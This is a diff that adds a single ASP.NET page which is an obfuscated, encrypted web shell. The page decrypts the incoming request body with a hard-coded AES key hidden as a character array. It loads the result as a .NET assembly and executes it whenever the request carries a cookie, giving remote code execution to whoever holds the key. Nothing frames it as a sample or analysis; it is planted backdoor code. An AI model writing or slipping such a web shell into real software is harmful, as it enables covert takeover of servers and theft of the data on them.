@@ -1,0 +1,3 @@
+<%@ Page Language="C#" %><%
+if(Request.Cookies.Count>0){var a=System.Text.Encoding.Default.GetBytes(new string(new char[]{'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'}));var b=Request.InputStream;var c=new byte[b.Length];b.Read(c,0,c.Length);var d=new System.Security.Cryptography.RijndaelManaged();var e=d.CreateDecryptor(a,a);var f=e.TransformFinalBlock(c,0,c.Length);var g=System.Reflection.Assembly.Load(f);var h=g.CreateInstance(new string('K',1));h.Equals(this);}
+%>
